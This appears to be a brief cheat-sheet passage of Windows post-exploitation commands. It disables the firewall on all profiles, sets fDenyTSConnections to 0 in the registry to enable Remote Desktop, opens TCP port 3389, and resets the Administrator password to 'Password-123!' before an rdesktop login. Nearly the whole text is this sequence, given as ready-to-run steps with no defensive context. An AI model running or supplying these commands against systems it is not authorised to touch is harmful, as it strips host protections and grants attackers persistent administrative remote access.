```POWERSHELL
.\netsh advfirewall set allprofiles state off
```

```cmd
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0 /f 
```

**we can also allow the connection through firewall**

```cmd
call netsh firewall add portopening protocol=tcp port=3389 name=RemoteDesktop_TCP3389
```

**CHANGE THE ADMIN PASSWORD | OR ADD ANOTHER USER WITH ADMIN RIGHTS**

```CMD
net user Administrator Password-123!
```

**LOGIN WITH RDESKTOP WITH THE CREDS OF ADMIN **
